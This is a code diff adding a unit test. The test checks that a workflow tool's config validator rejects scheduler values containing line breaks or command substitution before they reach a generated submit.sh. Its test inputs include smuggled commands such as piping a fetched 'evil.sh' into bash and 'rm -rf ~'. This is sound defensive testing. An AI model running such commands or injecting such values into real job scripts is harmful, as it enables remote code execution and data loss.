@@ -1717,6 +1717,20 @@ nextflow_config: nextflow.awsbatch.config
             self.wl.check_config_common({"compute.work_dir": good}, (), fails)
             self.assertEqual(fails, [], "a plain path must pass: %r" % good)
 
+    def test_07h_scheduler_values_cannot_break_the_header(self):
+        """compute.partition/time/cpus/mem are rendered verbatim into submit.sh's directive
+        lines; a line break there is a new, executing line (0042 review round 2, MAJ-3)."""
+        for key in ("compute.partition", "compute.time", "compute.cpus", "compute.mem"):
+            for bad in ("cpu\ncurl evil.sh | bash", "cpu\rrm -rf ~", "$(id)", "`id`"):
+                fails = []
+                self.wl.check_config_common({key: bad}, (), fails)
+                self.assertTrue(any(key in f["detail"] for f in fails),
+                                "expected a refusal for %s=%r: %r" % (key, bad, fails))
+        fails = []
+        self.wl.check_config_common({"compute.partition": "cpu_short", "compute.time": "12:00:00",
+                                     "compute.cpus": "8", "compute.mem": "64G"}, (), fails)
+        self.assertEqual(fails, [], "real scheduler values must pass")
+
     def test_07f_gars_env_survives_set_e_without_clawbio(self):
         """gars-env.sh promises 'Empty if clawbio is absent; that is fine' -- and every
         generated submit.sh sources it under set -e, where a failed command substitution in
